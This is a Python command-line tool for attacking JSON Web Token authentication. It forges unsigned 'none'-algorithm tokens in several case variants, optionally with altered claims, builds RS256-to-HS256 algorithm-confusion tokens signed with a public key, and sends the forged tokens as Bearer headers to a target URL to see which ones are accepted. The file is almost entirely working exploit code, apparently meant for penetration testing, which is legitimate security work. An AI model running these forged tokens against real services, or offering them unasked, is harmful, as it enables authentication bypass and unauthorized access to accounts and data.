#!/usr/bin/env python3
"""Agent for performing JWT 'none' algorithm attack testing."""

import json
import argparse
import base64
import hmac
import hashlib
from datetime import datetime


def b64url_encode(data):
    """Base64url encode bytes."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(s):
    """Base64url decode string."""
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


def decode_jwt(token):
    """Decode and display JWT components without verification."""
    parts = token.split(".")
    if len(parts) not in (2, 3):
        return {"error": "Invalid JWT format — expected 2 or 3 parts"}
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    signature = parts[2] if len(parts) == 3 else ""
    vuln_checks = {
        "alg_none_in_header": header.get("alg", "").lower() in ("none", ""),
        "alg_symmetric": header.get("alg", "").startswith("HS"),
        "no_expiry": "exp" not in payload,
        "expired": payload.get("exp", float("inf")) < datetime.utcnow().timestamp() if "exp" in payload else False,
        "no_issuer": "iss" not in payload,
    }
    return {"header": header, "payload": payload, "signature_present": bool(signature), "vulnerability_checks": vuln_checks}


def forge_none_token(token, modify_claims=None):
    """Forge a JWT with 'none' algorithm (removes signature)."""
    parts = token.split(".")
    payload = json.loads(b64url_decode(parts[0]))
    claims = json.loads(b64url_decode(parts[1]))
    if modify_claims:
        claims.update(modify_claims)
    none_header = b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    new_payload = b64url_encode(json.dumps(claims).encode())
    variants = [
        {"name": "alg_none", "token": f"{none_header}.{new_payload}."},
        {"name": "alg_None", "token": f"{b64url_encode(json.dumps({'alg': 'None', 'typ': 'JWT'}).encode())}.{new_payload}."},
        {"name": "alg_NONE", "token": f"{b64url_encode(json.dumps({'alg': 'NONE', 'typ': 'JWT'}).encode())}.{new_payload}."},
        {"name": "alg_nOnE", "token": f"{b64url_encode(json.dumps({'alg': 'nOnE', 'typ': 'JWT'}).encode())}.{new_payload}."},
        {"name": "empty_sig", "token": f"{none_header}.{new_payload}"},
        {"name": "no_dot", "token": f"{none_header}.{new_payload}"},
    ]
    return {
        "original_claims": json.loads(b64url_decode(parts[1])),
        "modified_claims": claims,
        "forged_tokens": variants,
    }


def test_alg_confusion(token, public_key_file=None):
    """Test algorithm confusion (RS256 -> HS256 using public key as HMAC secret)."""
    parts = token.split(".")
    header = json.loads(b64url_decode(parts[0]))
    claims = json.loads(b64url_decode(parts[1]))
    results = {"original_alg": header.get("alg"), "tests": []}
    if public_key_file:
        try:
            pubkey = open(public_key_file, "rb").read()
            hs256_header = b64url_encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
            payload_b64 = b64url_encode(json.dumps(claims).encode())
            signing_input = f"{hs256_header}.{payload_b64}".encode()
            signature = b64url_encode(hmac.new(pubkey, signing_input, hashlib.sha256).digest())
            results["tests"].append({
                "name": "RS256_to_HS256_confusion",
                "forged_token": f"{hs256_header}.{payload_b64}.{signature}",
                "description": "Uses RSA public key as HMAC-SHA256 secret",
            })
        except Exception as e:
            results["tests"].append({"name": "RS256_to_HS256_confusion", "error": str(e)})
    none_header = b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    payload_b64 = b64url_encode(json.dumps(claims).encode())
    results["tests"].append({
        "name": "alg_none_downgrade",
        "forged_token": f"{none_header}.{payload_b64}.",
        "description": "Downgrade to 'none' algorithm — removes signature",
    })
    return results


def test_jwt_endpoint(url, original_token, forged_tokens, headers=None):
    """Test forged JWTs against a target endpoint."""
    try:
        import requests
    except ImportError:
        return {"error": "requests not installed"}
    hdrs = headers or {}
    results = []
    for ft in forged_tokens:
        test_headers = {**hdrs, "Authorization": f"Bearer {ft['token']}"}
        try:
            resp = requests.get(url, headers=test_headers, timeout=10)
            accepted = resp.status_code in (200, 201, 204)
            results.append({
                "variant": ft["name"], "status": resp.status_code,
                "accepted": accepted, "body_snippet": resp.text[:200],
            })
        except Exception as e:
            results.append({"variant": ft["name"], "error": str(e)})
    orig_resp = None
    try:
        resp = requests.get(url, headers={**hdrs, "Authorization": f"Bearer {original_token}"}, timeout=10)
        orig_resp = {"status": resp.status_code, "body_length": len(resp.text)}
    except Exception:
        pass
    vulnerable = [r for r in results if r.get("accepted")]
    return {
        "url": url, "original_response": orig_resp,
        "tests": results, "vulnerable_variants": len(vulnerable),
        "finding": "JWT_NONE_VULNERABLE" if vulnerable else "JWT_NONE_REJECTED",
        "severity": "CRITICAL" if vulnerable else "INFO",
    }


def main():
    parser = argparse.ArgumentParser(description="JWT None Algorithm Attack Agent")
    sub = parser.add_subparsers(dest="command")
    d = sub.add_parser("decode", help="Decode JWT token")
    d.add_argument("--token", required=True)
    f = sub.add_parser("forge", help="Forge none-algorithm token")
    f.add_argument("--token", required=True)
    f.add_argument("--claims", help="JSON claims to modify")
    c = sub.add_parser("confuse", help="Test algorithm confusion")
    c.add_argument("--token", required=True)
    c.add_argument("--pubkey", help="RSA public key file for HS256 confusion")
    t = sub.add_parser("test", help="Test forged tokens against endpoint")
    t.add_argument("--url", required=True)
    t.add_argument("--token", required=True)
    args = parser.parse_args()
    if args.command == "decode":
        result = decode_jwt(args.token)
    elif args.command == "forge":
        claims = json.loads(args.claims) if args.claims else None
        result = forge_none_token(args.token, claims)
    elif args.command == "confuse":
        result = test_alg_confusion(args.token, args.pubkey)
    elif args.command == "test":
        forged = forge_none_token(args.token)
        result = test_jwt_endpoint(args.url, args.token, forged["forged_tokens"])
    else:
        parser.print_help()
        return
    print(json.dumps(result, indent=2, default=str))


if __name__ == "__main__":
    main()
